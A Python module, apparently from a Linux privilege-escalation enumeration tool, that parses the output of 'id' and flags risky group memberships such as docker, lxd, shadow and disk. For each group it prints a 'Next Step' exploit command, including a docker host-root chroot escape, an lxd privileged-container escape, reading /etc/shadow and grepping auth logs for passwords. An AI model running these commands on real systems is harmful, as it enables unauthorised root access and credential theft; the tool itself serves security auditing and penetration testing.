from core.utils import run_command
from core import vectors
from core.printer import (
    print_section, print_critical, print_high,
    print_info, print_not_found
)

VECTOR_NAME = vectors.USER_GROUPS

DANGEROUS_GROUPS = {
    "docker": {
        "severity": "CRITICAL",
        "risk"    : "Docker group = root equivalent. Container escape to host root is trivial.",
        "command" : "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "ref"     : "https://gtfobins.github.io/gtfobins/docker/"
    },
    "lxd": {
        "severity": "CRITICAL",
        "risk"    : "LXD group allows container creation with root filesystem mount.",
        "command" : "lxc init ubuntu:18.04 privesc -c security.privileged=true && lxc start privesc && lxc exec privesc -- chroot /r /bin/bash",
        "ref"     : "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation"
    },
    "shadow": {
        "severity": "CRITICAL",
        "risk"    : "Can read /etc/shadow directly — extract password hashes.",
        "command" : "cat /etc/shadow",
        "ref"     : "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe"
    },
    "disk": {
        "severity": "CRITICAL",
        "risk"    : "Can access raw disk — read entire filesystem including sensitive files.",
        "command" : "debugfs /dev/sda1 → cat /etc/shadow",
        "ref"     : "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#disk-group"
    },
    "sudo": {
        "severity": "HIGH",
        "risk"    : "User is in sudo group — may have password-based root access.",
        "command" : "sudo su -",
        "ref"     : "https://book.hacktricks.xyz/linux-hardening/privilege-escalation"
    },
    "adm": {
        "severity": "HIGH",
        "risk"    : "Can read system logs — may contain credentials or sensitive info.",
        "command" : "cat /var/log/auth.log | grep -i password",
        "ref"     : "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#adm-group"
    },
    "video": {
        "severity": "HIGH",
        "risk"    : "Can access /dev/fb0 framebuffer — capture screen contents.",
        "command" : "cat /dev/fb0 > /tmp/screen.raw",
        "ref"     : "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#video-group"
    },
    "staff": {
        "severity": "HIGH",
        "risk"    : "Can write to /usr/local — may allow binary or library hijacking.",
        "command" : "Place malicious binary in /usr/local/bin called by root",
        "ref"     : "https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe"
    },
}


def run() -> list:
    print_section(VECTOR_NAME)

    raw = run_command("id")
    if not raw:
        print_not_found("User Groups", {
            "Checked": "id command",
            "Result" : "Could not retrieve user information"
        })
        return [{"vector": vectors.USER_GROUPS, "severity": "CLEAN", "count": 0}]

    # Current user info dikhao
    print_info("Current User Identity", {
        "id output": raw
    })

    # Group names extract karo
    user_groups = set()
    for part in raw.replace(",", " ").split():
        if "(" in part and ")" in part:
            group_name = part.split("(")[1].replace(")", "").strip().lower()
            user_groups.add(group_name)

    critical_found = []
    high_found     = []

    for group in user_groups:
        if group in DANGEROUS_GROUPS:
            entry = DANGEROUS_GROUPS[group]
            if entry["severity"] == "CRITICAL":
                critical_found.append((group, entry))
            else:
                high_found.append((group, entry))

    for group, entry in critical_found:
        print_critical(f"User in Dangerous Group: {group}", {
            "Risk"     : entry["risk"],
            "Next Step": entry["command"],
            "Reference": entry["ref"]
        })

    for group, entry in high_found:
        print_high(f"User in Sensitive Group: {group}", {
            "Risk"     : entry["risk"],
            "Next Step": entry["command"],
            "Reference": entry["ref"]
        })

    if not critical_found and not high_found:
        print_not_found("Dangerous Group Membership", {
            "Checked": "docker, lxd, shadow, disk, sudo, adm, video, staff",
            "Result" : "User is not in any high-risk groups"
        })
        return [{"vector": vectors.USER_GROUPS, "severity": "CLEAN", "count": 0}]

    results = []
    if critical_found:
        results.append({"vector": "Dangerous Groups", "severity": "CRITICAL", "count": len(critical_found)})
    if high_found:
        results.append({"vector": "Sensitive Groups", "severity": "HIGH", "count": len(high_found)})

    return results